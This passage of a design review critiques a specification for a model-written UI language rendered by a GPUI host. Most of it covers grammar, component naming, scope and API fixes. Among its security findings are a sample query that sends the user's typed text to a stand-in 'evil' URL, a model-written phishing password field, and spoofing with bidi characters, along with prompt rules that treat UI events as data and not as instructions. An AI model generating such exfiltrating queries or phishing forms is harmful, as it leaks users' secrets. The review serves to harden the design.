  - `ModelEvent` must carry the clicked node's visible label and a `"source":"ui_event"` marker.
  - The prompt (P7) tells the model that a ui-event is a UI interaction, not new instructions.
  - Hosts must display the `say` message in the transcript as sent.

### M17. Queries run automatically and can carry typed user data out (2.14 l.399, 7.4 l.929, 11 l.1383)

- Queries run after `finish()` with no gesture, and re-run on every state change.
- Counterexample: `query q := tool("web.fetch", {url: "https://evil/?" ++ $note}, default: null)` sends what the user types to an arbitrary URL through a read tool. "Args are evaluated from state the user can see" is not a mitigation.
- **Fix:**
  - `ToolDescriptor` gets `auto_run: bool` (default `false` for any tool with a URL- or free-text-typed arg).
  - Queries whose args depend on `$state` require `Allow` for each distinct arg hash, or a policy that is cached for each tool.
  - Taint rules from B7 apply to tool args that are typed as URLs.

### M18. A model-controlled `sensitive` flag cannot protect secrets (2.13 l.386, 8.1 l.1016, 7.2 l.888)

- The model sets `kind` and `sensitive`. A phishing program writes `TextField("Password", bind: $pw)` with `kind: "text"`, and the value then flows into `!say(..., {pw: $pw})`, `fmt(...)` or query args.
- Even when the field is sensitive, `$pw` is still readable in expressions, so `Para($pw)` or a query arg leaks it.
- **Fix:**
  1. Sensitive bindings are **write-only**: reading them in any expression yields `Null` (`state.sensitive_read`), except tool args a host-registered tool marks as accepting secrets.
  2. `kind: "password"` forces `sensitive`.
  3. P11 hard rule: never ask for passwords, card numbers or one-time codes.
  4. The host MAY use a label heuristic to force `sensitive`.

### M19. Several passages are close to the openui report's wording or design (4.6, 7.3-7.4, 9.5, 12, 2.13)

Ideas are fine. These passages track the report's specific expression and structure closely enough that I would rewrite or redesign them:

- **4.6 l.667.** "clear on stream start, emit only on change, send an empty list on recovery". The report says: "Clear errors when a stream starts. Emit on change only. Signal recovery with an empty list." Same three rules, same order. Rewrite as your own state machine (for example "feedback is a pure function of the final program; the host diffs it").
- **Actions `!set($x, expr)`, `!reset($a, $b)`, `!run(name)`, with "take their targets by name and do not evaluate them" (l.413).** These are one-to-one with the report's `@Set($v, expr)`, `@Reset($a, $b)`, `@Run(ref)` and "name their targets instead of evaluating them". Only the sigil and case differ. Split `run` into `call(mutation)` and `refresh(query)`, which also removes an overload, and fold `reset` into `set($x, default)` or `restore($x)`. See M21.
- **7.4 query and mutation lifecycle.** "A second run while Loading is rejected. Args are evaluated at fire time." and "While refetching, the previous result stays visible… A late response for a stale key is discarded" track the report sentence by sentence. 2.14's "a query depends on every `$state` read literally in its args" matches as well. Re-derive these from your own state machine, for example a request table keyed by `(stmt, args_hash)` with explicit transitions, and write that instead.
- **9.5 GC exceptions** ("except `$state` declarations and statements referenced from `query`/`mutate` args"). This is the report's list verbatim in substance. M7 changes the rule anyway (reachability through all references), which removes the overlap.
- **2.13 validators and rules.** The set `required, email, url, number, min_len, max_len, min, max` is the report's set snake-cased. "Empty values skip every rule except required; the first failure is the field's error" matches the report's sentence. Keep the semantics (they are standard), but word them independently, and consider a different shape such as `required: true, max_len: 60` as named field props instead of a `rules` list.
- **12.1 fixture layout.** `chunks.json` and `interactions.json` are the same file names, plus "Level 1 / Level 2" with the same meaning and "fixtures are authoritative". Rename (for example `stream.json`, `script.json`, tiers "core" and "interactive").
- **P8 statement order** ("root, state, queries, layout, leaves") is the report's order. **8.3 groups** with an "Other" bucket, and the signature style `opt?: type`, also match. These are low risk, but note them in a hygiene log.
- **Appendix A.** Calling the sources "report A/B" while listing taken items in this much detail is fine. Add a short hygiene log that lists each borrowed *idea* and how its *expression* was made independent.

### M20. The header, `:=`, `--`, `++` and `!` are unfamiliar to models and add repair cost (2.2, 2.8, 2.14)

| Current | Likely model behavior | Proposal |
| --- | --- | --- |
| `%ui 1 lib=std@0.1` first line | Often omitted, or written after a fence, or as `# ui`. Costs about 8-10 tokens per message for information the host already knows (it generated the prompt). | Make it optional and silent. The program is delimited by a ```` ```ui ```` fence or starts at the first statement line. Version and library are recorded by the host in `StoredMessage`. Keep `%ui` (or a fence info string such as ```` ```ui v1 patch ````) only for `mode=patch`. Drop `dir=`. |
| `name := expr` | Models default to `=` (Python, JS, Rust `let`, YAML-like). | Accept `=` as the binder. Optionally accept `:=` silently too. `=` is unambiguous at statement start because expressions have no assignment. (Clean-room: `=` is a universal convention, not distinctive expression. See the note under M21.) |
| `--` comments | Models write `//` or `#`. Also, `10--3` (meaning `10 - -3`) silently becomes `10` plus a comment. | Use `//`. Treat `#` at column 0 as a comment for tolerance. |
| `++` string concat | Models write `+`, which gives `expr.type`, which gives `Null`, which gives an empty label. | `+` on two `Str` concatenates. Mixed `Str + Int` stays `expr.type`, so strictness is kept. Drop `++`. |
| `!set(...)`, `!run(...)` | `!` reads as negation. `!=` versus `!x` need special lexing, and `!` cannot then be "not". | Plain calls in action-typed props: `on_click: set($tab, "x")`, `call(save)`, `refresh(q)`, `say("...")`, `open(url)`, `seq(...)` or a list. They resolve as actions because the prop type is `action` (as validators already resolve by prop type). |
| `and` / `or` / `not` | Models trained on JS and Rust write `&&`, `||` and `!`. | Accept `&&`, `||` and `!` as aliases (once `!` is free), or switch to them. Keep `if(c, a, b)`. Consider accepting `c ? a : b` later, but not in phase 1 (multi-line splitter cost). |
| `key: \|x\| x.id` | Fine for Rust-trained models, but verbose. | Also accept `key: "id"` (a field path), which is shorter and has no lambda. |

### M21. Component names are unfamiliar. Use ordinary names (2.15, 8.1, 10.3)

`Vert`, `Horiz`, `Para`, `Tiles`, `Items`, `Picture`, `Glyph`, `Foldout`, `Choice`, `Checks`, `Radios`, `Range`, `AreaField`, `Md`, `Rule` and `Gap` match no mainstream vocabulary. Models will write `Column`, `Row`, `Text`, `Grid`, `Image` and so on anyway, which triggers `schema.unknown_component` and drops nodes. `Range` also clashes with the `range()` builtin and the example's `$range`.

Proposed renames:

| Current | Proposed | Note |
| --- | --- | --- |
| Vert | `Column` | |
| Horiz | `Row` | |
| Tiles | `Grid` | |
| Para | `Text` | |
| Md | `Markdown` | |
| Rule | `Divider` | |
| Gap | `Spacer` | |
| Panel | `Card` | |
| Items | `List` | |
| DataTable | `Table` | Its column helper becomes `TableColumn`. Do not use `Column`, which is now layout, or `Col`, which is openui's. |
| Picture | `Image` | |
| Glyph | `Icon` | |
| Foldout | `Collapsible` | |
| Choice | `Select` | |
| Check | `Checkbox` | |
| Checks | `CheckboxGroup` | |
| Radios | `RadioGroup` | |
| Toggle | `Switch` | |
| Range | `Slider` | |
| TextField | `Input` | |
| AreaField | `TextArea` | |
| LinkButton | `Link` | |
| Callout | `Alert` | Also moves away from openui's `Callout`. |
| Badge | `Badge` | Unchanged. |
| Heading, Button, Form, Tabs/Tab, Progress, Chart, Code | Unchanged | |

- Clean-room note: these are standard HTML, ARIA and design-system names, and several also appear in openui's inventory (`Card`, `Image`, `Tabs`, `Select`, `Slider`, `Form`). Function names drawn from a public vocabulary are not protected expression.
- To keep a clear provenance trail, take the list from a named public source (ARIA roles plus the gpui-kit catalog, which is also these names) and record that in the hygiene log.
- Avoid `Stack`, openui's root container.
- If you adopt `=` (M20) and these names, the surface looks more like openui's (`name = Comp(...)`, `$state`, `root`). The real differences remain: named optional arguments, typed lambdas, `query`/`mutate` statement forms, refs, and the patch IR. Note this in the hygiene log.

### M22. Model-authored `fallback :=` costs tokens on every message (2.3 l.197, 4.7, 9.3 l.1212)

- The model writes the content twice: once as UI and once as markdown. For text-heavy UIs that comes close to doubling output tokens.
- 4.7 already derives fallback text from `to_text` templates.
- **Fix.** Drop the `fallback` statement from P1-P11 by default and make it opt-in (`features.model_fallback`). This also removes the reserved-name special case and the GC exception (M7).

### M23. Undefined builtins and statement forms (2.7, 2.14 l.398, 2.5 l.255)

- `ref("t4.places")` is used in 2.15 and 7.5, but `ref` is not a builtin in 2.7. The spec does not say whether its argument must be a literal.
- The validator calls `required()`, `email()` and `max_len(60)` are lowercase IDENT calls, which 2.2 says are function calls. They are not in 2.7, and the spec does not say they resolve only in `rules:`.
- `tool` is a keyword, so a bare `tool(...)` in an expression is a *syntax* error, not the `syntax.stmt_shape` that 2.14 promises.
- **Fix:**
  - Add `ref(id: string literal) -> Ref` to 2.7, literal only (`ref.invalid` otherwise).
  - "Calls inside a `validator`-typed or `action`-typed prop resolve against the validator or action registries first."
  - Make `tool(` in expression position parse as a call that is rejected with `syntax.stmt_shape`.

### M24. No cap on the number of queries or the refresh load (7.1, 2.14)

- 2,000 statements could all be `query ... every: 5s`, which makes 400 tool calls per second against the host.
- **Fix.** Add `max_queries` (default 8, ceiling 64) and `max_concurrent_requests` (4). The refresh interval minimum is 30s for automatically run tools.

### M25. Some phase-1 diagnostics and guarantees depend on rendering details that are not specified (5.2 l.716, 3.3 rule 5)

- If a tail stops parsing (for example while typing `|p|`), rule 5 produces no provisional statement. The previously shown provisional nodes are then removed (diff against "previous provisional output") and re-inserted on the next chunk. This flickers for every partial lambda, partial `!action`, and so on.
- **Fix.** "If the closed tail fails to parse, the previous provisional output for that statement is kept unchanged."

### M26. The edit-mode hint format and P4 signature format conflict with the calling rules (4.6 l.657, 9.1 P4)

- Already covered in part by B4. Separately, P4's format `Name(req1: type, req2: type; opt?: type = default)` is the only place where the model learns which arguments are positional.
- The `%diag` hint uses a different format (`DataTable(columns: Column[]; rows, ...)`, untyped `rows`).
- **Fix.** "Hints use exactly the P4 signature line."

### M27. Overlays cannot be confined to the message region (11 l.1385)

- Kit popups (Select menu, Tooltip, HoverCard, Dialog, Notification) render in the window-level `Root` overlay layer, not inside the message's bounds.
- **Fix.** "Phase-1 library has no modal or free-positioned overlays (no Dialog, Sheet or Notification). Only anchored popovers owned by kit inputs (Select, Tooltip) are allowed."

---

## Minor

- **m1. Tail closing names only IDENT and COMP as growing tokens (3.3.2 l.488).** Keywords (`true` → `true_count`, `not` → `note`), `STATE` (`$d` → `$dishes`), `ACTION` (`!ru`), DURATION (`5m` → `5ms`), a lone `!` or `%`, and `` ` `` at line start can all grow too. Fix: "Any token that touches the end of the buffer and could be extended by further bytes into a different token is removed (IDENT, COMP, keyword, STATE, ACTION, DURATION, operator prefixes `!`, `=`, `<`, `>`, `:`, `+`, `-`, `/`)."
- **m2. The resync pattern's `\s*` can match a newline (2.4 l.213).** Use `[ \t]*`. Apply it to tokens, so a column-0 `-- x := 1` comment never resyncs.
- **m3. Over-depth bracket behavior in the splitter is undefined (`max_bracket_depth`).** Fix: "brackets beyond depth 32 are counted but their contents are skipped; the statement is closed at the matching depth with `limit.expr_depth`."
- **m4. Grammar ambiguity: a lambda is reachable both from `positional = expr | lambda` and from `primary = lambda_use` (2.5 l.248, l.258-262).** As written, `1 + |x| x` parses. Fix: remove `lambda_use` from `primary`.
- **m5. Which statements claim a name is unspecified.** Is a statement dropped by `syntax.stmt_shape`, `name.reserved` or a resync cut still a definition for "first wins"? Fix: "a statement claims its name iff its left side `name :=` was parsed, regardless of whether its right side survived."
- **m6. Float formatting cites "Rust `Display` rules … scientific form outside 1e-5..=1e16" (2.6 l.289).** Rust's `Display` for f64 never uses scientific notation. Fix: "shortest round-trip digits (as produced by the `ryu` algorithm), printed positionally when the decimal exponent is in [-5, 16], else as `d.ddde±x`." Also say that `fixed` rounds the exact binary value: `fixed(2.675, 2)` = `"2.67"`.
- **m7. `Int` literal passed to a `float` prop is not addressed (2.6 "no implicit coercion").** Fix: "Int widens to Float where a float is expected; no other coercion."
- **m8. Invalid `\u{...}` (above U+10FFFF, or a surrogate) is unspecified (2.2 l.168).** Fix: U+FFFD with `syntax.bad_escape`.
- **m9. Duplicate keys in a map literal are unspecified.** Fix: first wins, `syntax.dup_key`.
- **m10. A bare COMP not in call position (`x := Vert`) is unspecified.** Fix: `syntax.stmt_shape`, or treat as a zero-argument call.
- **m11. `fmt` placeholder count mismatch is unspecified.** Fix: missing values render as an empty string with `expr.fmt_args`, and extras are ignored.
- **m12. `sort_by` fuel cost (2.7 l.312).** Charge `n·ceil(log2 n)`, not `n`.
- **m13. Coalescing an `Insert` then `Remove` of the same node (6.4) must also drop intervening ops on that node and its descendants.** Say so.
- **m14. `snapshot(&self)` changes the epoch (G8) but takes `&self` (13).** It changes the epoch for every consumer, which is a problem when one of several renderers is resyncing. Fix: `snapshot(&mut self)`, and say "the epoch changes only on `reset()`; snapshots carry the current epoch and the current seq."
- **m15. `UiEvent::Activate { node, handle }` (7.3 l.905) against `Activate { node }` (7.6 l.952).** Pick one.
- **m16. `HostServices::policy` is synchronous, but `AskUser` is asynchronous (13 l.1547).** Fix: `policy()` returns `Allow | Deny | AskUser(prompt)`. The core parks the request until `Session::resolve_policy(id, Allow|Deny)`.
- **m17. Ref-resolved data is tagged `Provenance::Host` (7.5 l.943), but tool data is "semi-trusted" and may contain attacker URLs (a web page's images).** Fix: `Provenance::{Model, Tool, Host}`, with URL policy keyed on it.
- **m18. The extractor switches to `Program` on a column-0 `%ui` line even inside a prose code fence in another language (2.9).** Track prose fences, and enter `Program` only outside them.
- **m19. Exact pinning is incomplete (10.9 l.1362).** `gpui-kit 0.8.0` depends on `gpui-base ^0.8.0` and `gpui-component ^0.8.0` (caret). Pinning `gpui-kit = "=0.8.0"` alone lets those float within 0.8.x on `cargo update`. Fix: also pin `gpui-component = "=0.8.0"`, `gpui-base = "=0.8.0"` and `gpui-pre = "=0.3.9"`, and fill in the placeholders now (they exist today): `gpui-kit =0.8.0` / `gpui-pre =0.3.9`.
- **m20. Accessibility statements are out of date (0.2 l.27, 14.2-11 l.1606).** See M13. Change the non-goal to "OS accessibility via `gpui::Role`/accesskit is attempted for inputs and headings; full coverage later."
- **m21. `Para` is "styled text with inline spans" (10.3 l.1290) and also "Plain text … no markup".** There is no syntax for spans. Fix: plain text only, and use `Markdown` for emphasis.
- **m22. `%diag` example inconsistencies (4.6 l.654-657).** `Chart` has no `tone` argument, programs have no names (`program=sales`), and `arg=` is not a `Diagnostic` field (`path` is). Fix the example.
- **m23. `Diagnostic` has no `message` field, but 12.2 says "`message` and `hint` text is not compared".** Add `message`, or drop the mention.
- **m24. Data-dependent `each` keys are typed values, but path rendering is "key rendered as text".** So `1` and `"1"` collide. This is covered by the type tag in B3. Also define keys of type Float or Map as `schema.bad_key`.
- **m25. Bidi and invisible control characters in model text (U+202E, U+200B and similar) enable spoofing inside labels (11 "UI redress").** Fix: strip or escape bidi override and isolate characters in all model-written text props.

---

## Nit

- **n1. `Op::Reset` and `Renderer::reset()` duplicate each other (6.2, 13).** Keep only the op.
- **n2. The heading "Rename stability" (5.2 l.720) describes same-path stability, not renaming.** Renaming a statement changes the path.
- **n3. 10.3 says "That is 30 components (some are sub-components: `Column`, `Tab`, and `Option`…)", but none of those three is in the 30 rows, and `Option` is never defined.**
- **n4. `<name>-core` lists `xxhash` but 8.2 hashes with `blake3`, which is not listed.** Pick one per purpose.
- **n5. 8.2 `"root": "Vert"`: the library root component is never used by any rule.** Remove it. It is also an openui concept (fallback entry), so removing it helps hygiene.
- **n6. 7.7 `"source":{"node":"go"}` is a statement name, but nodes are NodeIds.** Use `{"stmt":"go","node":"root/#3"}`.
- **n7. `syntax.header_missing` as a Warning fed back to the model each turn wastes prompt tokens.** If M20 is adopted, remove it.
- **n8. DURATION `10min` lexes as `10m` followed by `in`.** Mention it in a fixture.
- **n9. "`no_std`-friendly goal" (1.2) conflicts with `IndexMap`/`Arc<str>`/`std::error::Error` in the API.** Drop the goal for phase 1.
- **n10. 8.6 "plus those whose fallback chain is not needed" is garbled.** Rewrite it.
- **n11. Strip a leading U+FEFF at program start (2.2).**
- **n12. 10.8 "The release profile MUST use `panic = "unwind"`" binds the host's profile, which a library cannot enforce.** Phrase it as a host requirement and detect it at runtime (`cfg(panic = "unwind")`).
- **n13. "Toggle" (library) maps to kit `Switch`, but kit also has `button::Toggle`, which is different.** M21's rename to `Switch` resolves this.
- **n14. 2.2 "Reserved statement names: `root`, `fallback`" is followed by both being *required* or special names.** Say "special" names, and keep `name.reserved` for keywords and `__` names.

---

## Over-engineering: what to cut or defer for phase 1 (one renderer, one library)

| Cut or defer | Where | Why |
| --- | --- | --- |
| Binary wire format, PropId-as-integer, library hash in stream header | 6.5 | In-process only. JSON Lines covers tests and logging. |
| 9.3 message streaming protocol (open/chunk/close, resume by seq) | 9.3 | Hosted service and transport are non-goals (0.2). |
| JSON Schema export | 8.4 | No consumer in phase 1. |
| `<name>-derive` proc macros | 1.2, 8.1 | Large M2 cost. A data-driven builder (`ComponentDef::new("Button").req("label", Text)…`) covers 30 components. Add macros later. |
| Extension API beyond `add_component`/`add_function` (override, remove, add_to_slot, compat lint against previous hash) | 8.5, 8.7 | One first-party library. |
| Capability bitflags (18), fallback chains, prompt pruning by caps | 8.6, 10.2 | GPUI is the only target. Keep a per-component `to_text` only. |
| Model-authored `fallback` statement | 2.3, 4.7 | Token cost (M22). |
| Edit mode (`mode=patch`, `remove`, merge, GC, canonical regeneration) | 9.5 | Large and subtle (B8, M7). Ship after the chat flow works. If kept, implement B8's in-session design. |
| Mutations, `AskUser`, tool manifest | 7.4 | Phase 1 can ship read-only queries plus `say`. Mutations carry most of the safety risk (M16). |
| `every:` refresh timers, DURATION literal type, `tick()` virtual clock | 2.14, 13 | Removes a token type and the timer machinery. |
| Header attributes `dir=`, `lib=`, `mode=` | 2.8 | See M20. |
| `SetMeta` op | 6.2 | Roles are fixed per component, and the heading level is a prop. |
| `UiEvent::Visible`, `Toggle` (merge into `Edit`) | 7.6 | Fewer event kinds. |
| Builtins `distinct`, `reverse`, `concat`, `range`, `split`, `starts_with`, `ends_with`, `pct`, `clamp`, `host_now` | 2.7 | Keep about 15: `if`, `coalesce`, `len`, `first`, `last`, `each`, `map`, `filter`, `sort_by`, `sum`, `count`, `avg`, `min`, `max`, `fmt`, `fixed`, `join`, `upper`, `lower`, `text_of`, `ref`. |
| Components: `Gap`, `Glyph`, `LinkButton`, `AreaField` (as a `TextField` flag), `Checks`, `Foldout`, `Range`, `Progress` | 10.3 | About 20 components cover the 2.15 examples and the report-B use cases (cards, forms, table, chart, list, image). |
| Chart kinds area and pie, multi-series, legends | 10.3 | Kit lacks a legend (M13). Ship single-series bar and line. |
| CI-gated perf budgets (20% regression fails), Level-3 visual snapshots, 24-hour fuzz gate | 3.8, 12.5, M10 | Keep as non-gating reports in phase 1. |
| `no_std` goal, `xxhash` plus `blake3` | 1.2 | Simplify. |
| `Session::snapshot` multi-renderer epochs | 6.3 G7-G8 | One renderer per session in phase 1. |

The 28 conformance categories can stay as directories, but M0-M3 should populate only `lex`, `grammar`, `statements`, `streaming`, `resolve`, `schema` and `ir`.

---

## Appendix 1. Every DSL example checked against the EBNF (2.5) and lexer (2.2)

| Location | Line | Parses? | Problems |
| --- | --- | --- | --- |
| 2.11 l.350 | `Button("Save", tone: "primary", on_click: !run(save))` | Yes | None. |
| 2.11 l.351 | `Table([Column(...), ...], rows: tickets)` | Yes | `Table` is not a component (B4). |
| 2.11 l.352 | `Vert([header, body], gap: 3)` | Yes | |
| 2.12 l.364-365 | `$tab := "overview"`, `$qty := 1` | Yes | |
| 2.13 l.377-380 | form and fields | Yes | `$name` and `$email` are undeclared (M8). `required()` and `email()` call resolution is unspecified (M23). |
| 2.14 l.391 | `query tickets := tool(..., {status: $status}, default: [], every: 60s)` | Yes | Fragment (`$status` undeclared). `{query: ...}` would fail (M4). |
| 2.14 l.392-393 | `mutate close := ...`, `done := Button(... !seq(!run(close), !run(tickets)))` | Yes | |
| 2.15 dashboard l.420 | `%ui 1 lib=std@0.1` | **No** | `=`, `@` and `version` are undefined (B1). |
| l.421-424 | `root`, `$range`, `top`, `filters` | Yes | `Range` component versus `$range` naming (M21). |
| l.425 | `query sales := tool(...)` | Yes | |
| l.426 | `summary := Panel([Para(fmt(..., fixed(sum(sales, "revenue"), 2)))], title: ...)` | Yes | |
| l.427 | `grid := Tiles([chart, tbl], cols: 2)` | Yes | |
| l.428 | `chart := Chart("bar", data: sales, ...)` | Yes | `data` is required, so passing it by name gives an info diagnostic (B4). |
| l.429 | `tbl := DataTable([...], rows: sales)` | Yes | `rows` is required or optional depending on where you look (B4). |
| l.430 | `fallback := "## Sales\n..."` | Yes | It is a "reserved" name (n14). It is GC'd by edits (M7). |
| 2.15 refs l.436-438 | header; `root := Vert([Heading(...), list])`; `list := Items(each(ref("t4.places"), \|p\| Horiz([...]), key: \|p\| p.id))` | Header: no (B1). Rest: yes | `ref` is not a builtin (M23). `alt:` is required by 5.4 but passed by name (B4). |
| 2.15 form l.446-452 | header with a trailing space; `Panel`, `Radios`, `Checks`, `Button(... submit: true, on_click: !say(..., {...}))` | Header: no (B1). Rest: yes | `submit` with no enclosing `Form` (M8). The type of the `$use := []` element is undefined (M9). |
| 2.15 patch l.458-461 | `%ui 1 lib=std@0.1 mode=patch`; `top := ...`; `grid := ...`; `remove tbl` | Header: no (B1). Rest: yes | |
| 4.6 l.654-657 | `%diag` block | Not DSL | Inconsistencies listed in m22. |
| 8.1 l.992 | `example = r#"Button("Save", tone: "primary", on_click: !run(save))"#` | Yes | |
| 9.3 l.1205-1206 | the chunk text `%ui 1 lib=std@0.1\nroot := ` + `Vert([top])\n` | Header: no (B1) | `top` is unresolved. That is fine as a fragment. |

---

## Prioritized fix list

1. **B1 / M20.** Define the header micro-grammar, or make it optional, and fix extractor entry on bare statements.
2. **B2.** Make cycles path-based and budgets canonical-order. Drop `fuel_per_pass`. Add permutation fixtures.
3. **B3.** Replace the NodeId key scheme with typed, escaped, de-duplicated keys.
4. **B6.** Add slot flattening and null-skip rules.
5. **M1 / M2 / M3.** Splitter: resync whenever a statement is open, use the last *significant* token, hold back trailing CR, and add state-forward-ref diagnostics to the provisional list.
6. **B4 / M8 / M23.** Write the full phase-1 std signature table. Fix every example. Add `ref`. Run CI over SPEC.md code blocks.
7. **B7 / M16 / M17 / M18.** Image URL provenance and taint, write-tool confirmation rendered by the host, `auto_run` for tools, write-only sensitive state.
8. **B9 / M13 / M14 / M15.** Correct the GPUI API (Window in apply, lazy kit state, `cached` views, input sync rule). Replace the 10.3 mapping with the verified kit 0.8 names. Pin `gpui-kit =0.8.0`, `gpui-component =0.8.0`, `gpui-base =0.8.0` and `gpui-pre =0.3.9`.
9. **B5 / M9 / M10 / M11.** JSON encoding for patches, type appendix with renamed duplicates, complete `Recovery` and code tables.
10. **M21 / M20 / M22.** Rename components to ordinary names. Use `=`, `//`, `+` for strings, plain action calls and `&&`/`||`. Drop the default `fallback` statement.
11. **M4 / M5.** Contextual keywords, camelCase member access, rules for trailing tokens and mismatched closers.
12. **M19.** Rewrite the near-verbatim passages, rename the actions and fixture files, and start a hygiene log.
13. **B8 / M7.** Either defer edit mode, or adopt in-session edits with full reachability GC and the merge corner-case rules.
14. **M6, M12, M24-M27.** Then the minors and nits in order.
15. Apply the deferral table before M2 starts, to cut about 30-40% of phase-1 scope.
